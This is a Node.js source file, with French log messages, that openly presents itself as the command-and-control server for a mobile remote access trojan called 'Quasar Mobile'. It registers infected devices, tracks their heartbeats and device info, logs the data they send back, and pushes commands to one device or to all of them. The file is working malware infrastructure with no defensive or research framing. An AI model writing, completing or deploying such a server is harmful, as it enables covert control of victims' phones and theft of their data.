// server/index.js

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

const PORT = process.env.PORT || 3000;

const connectedDevices = {}; // { socketId: { id: deviceId, socketId: socketId, lastSeen: Date, info: {}, isConnected: boolean }, ... }

app.get('/', (req, res) => {
    res.send('Quasar Mobile C&C Server is running!');
});

io.on('connection', (socket) => {
    console.log(`[+] Un nouvel appareil s'est connecté: ${socket.id}`);

    const deviceId = uuidv4();
    connectedDevices[socket.id] = {
        id: deviceId,
        socketId: socket.id,
        lastSeen: new Date(),
        info: {},
        isConnected: true
    };

    socket.emit('assignedId', deviceId);
    console.log(`[Assign ID] Appareil ${deviceId} assigné à socket ${socket.id}`);

    socket.on('heartbeat', (deviceInfo) => {
        connectedDevices[socket.id].lastSeen = new Date();
        connectedDevices[socket.id].isConnected = true;
        connectedDevices[socket.id].info = deviceInfo || {};
        console.log(`[Heartbeat] Appareil ${deviceId} (${socket.id}) est en ligne. Infos:`, deviceInfo);
    });

    socket.on('data', (data) => {
        console.log(`[DATA] Reçu de ${deviceId} (${socket.id}):`, data);
    });

    socket.on('response', (responsePayload) => {
        console.log(`[RESPONSE] Reçu de ${deviceId} (${socket.id}):`, responsePayload);
    });

    socket.on('disconnect', () => {
        console.log(`[-] L'appareil ${deviceId} (${socket.id}) s'est déconnecté.`);
        if (connectedDevices[socket.id]) {
            connectedDevices[socket.id].isConnected = false;
        }
    });

    socket.on('error', (err) => {
        console.error(`[ERROR] Erreur de socket pour ${deviceId} (${socket.id}):`, err);
        if (connectedDevices[socket.id]) {
            connectedDevices[socket.id].isConnected = false;
        }
    });
});

function broadcastCommand(command, payload = {}) {
    console.log(`[BROADCAST] Envoi de la commande "${command}" à tous les appareils.`);
    io.emit('command', { command, payload });
}

function sendCommandToDevice(socketId, command, payload = {}) {
    if (io.sockets.sockets.has(socketId)) {
         console.log(`[SEND TO ${socketId}] Envoi de la commande "${command}".`);
         io.to(socketId).emit('command', { command, payload });
    } else {
        console.warn(`[SEND TO ${socketId}] Impossible d'envoyer la commande. Socket non trouvé.`);
    }
}

setInterval(() => {
    const activeSocketIds = Object.keys(connectedDevices).filter(sid => connectedDevices[sid].isConnected);
    if (activeSocketIds.length > 0) {
        const commandId = uuidv4();
        broadcastCommand('ping', { commandId: commandId });
    } else {
        console.log("[Status] Aucun appareil connecté pour envoyer le heartbeat périodique.");
    }
}, 30000);

server.listen(PORT, () => {
    console.log(`[*] Serveur C&C Quasar Mobile démarré sur le port ${PORT}`);
    console.log(`[*] En attente de connexions d'appareils RAT...`);
});

module.exports = {
    server,
    io,
    connectedDevices,
    broadcastCommand,
    sendCommandToDevice
};
